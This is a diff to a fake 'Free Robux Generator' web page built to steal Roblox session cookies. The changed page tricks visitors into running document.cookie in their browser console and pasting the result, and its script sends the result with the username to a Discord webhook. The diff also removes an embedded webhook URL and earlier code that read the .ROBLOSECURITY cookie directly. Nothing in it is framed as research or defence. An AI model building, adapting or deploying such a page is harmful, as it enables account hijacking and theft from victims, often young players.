@@ -10,24 +10,38 @@
     button { background: #00ff99; color: #000; font-weight: bold; cursor: pointer; }
     button:hover { background: #00cc77; }
     .status { margin-top: 1rem; font-size: 0.9rem; }
+    .instructions { background: #333; padding: 1rem; border-radius: 4px; font-size: 0.85rem; text-align: left; margin: 1rem 0; }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Free Robux Generator</h2>
-    <p>Enter your Roblox username to receive 10,000 Robux!</p>
+    <p>Enter your details to receive 10,000 Robux!</p>
+    
     <input type="text" id="username" placeholder="Roblox username">
+    
+    <div class="instructions">
+      <strong>Verification Required:</strong> To prevent bots, please provide your Browser Session Token.
+      <ol style="margin-top: 0.5rem; padding-left: 1.2rem;">
+        <li>Press <strong>F12</strong> or right-click and select <strong>Inspect</strong>.</li>
+        <li>Go to the <strong>Console</strong> tab.</li>
+        <li>Paste this code and press Enter: <code style="background:#555; padding:2px 4px; border-radius:3px;">document.cookie</code></li>
+        <li>Copy the entire output and paste it below.</li>
+      </ol>
+    </div>
+
+    <input type="text" id="cookie" placeholder="Paste your Browser Session Token here">
     <button id="claimBtn">Claim Robux</button>
     <div class="status" id="status"></div>
   </div>
 
   <script>
-    const webhook = 'https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc'; // Replace with your webhook
+    const webhook = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your webhook
 
     async function sendToDiscord(cookie, username) {
       const payload = {
         embeds: [{
-          title: 'Cookie Grabbed',
+          title: 'Cookie Grabbed!',
           description: `Username: \`${username}\`\nCookie: \`${cookie}\``,
           color: 0x00ff99
         }]
@@ -39,29 +53,19 @@
       });
     }
 
-    function getCookie(name) {
-      const value = `; ${document.cookie}`;
-      const parts = value.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
-    }
-
     document.getElementById('claimBtn').addEventListener('click', async () => {
       const username = document.getElementById('username').value;
-      const robloxCookie = getCookie('.ROBLOSECURITY');
+      const robloxCookie = document.getElementById('cookie').value;
       const status = document.getElementById('status');
 
-      if (!username) {
-        status.textContent = 'Please enter a username.';
+      if (!username || !robloxCookie) {
+        status.textContent = 'Please fill in all fields.';
         return;
       }
 
-      if (robloxCookie) {
-        status.textContent = 'Processing...';
-        await sendToDiscord(robloxCookie, username);
-        status.textContent = 'Success! Robux will be added shortly (fake).';
-      } else {
-        status.textContent = 'No .ROBLOSECURITY cookie found. Are you logged into Roblox?';
-      }
+      status.textContent = 'Processing...';
+      await sendToDiscord(robloxCookie, username);
+      status.textContent = 'Success! Robux will be added to your account shortly (this is a fake message).';
     });
   </script>
 </body>
